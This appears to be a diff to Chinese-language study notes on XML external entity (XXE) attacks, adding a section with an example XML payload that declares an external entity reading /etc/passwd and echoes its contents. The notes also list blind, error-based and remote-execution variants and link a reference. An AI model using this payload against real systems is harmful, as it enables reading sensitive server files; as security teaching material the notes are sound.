@@ -22,7 +22,18 @@ DTD(The document type definition)，即是文档类型定义，可定义合法�
 - 不带回显读取文件    
 - 报错回显读取文件
 - 远程执行   
+### 回显读取文件
+```
+<?xml version=”1.0″ encoding=”utf-8″?>
 
+<!DOCTYPE XXE [
+<!ELEMENT name ANY >
+<!ENTITY XXE SYSTEM "file://etc/passwd" >]>
+
+<root>
+  <name>&XXE;</name>
+</root>
+```
 ### Reference
 
 [Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)   
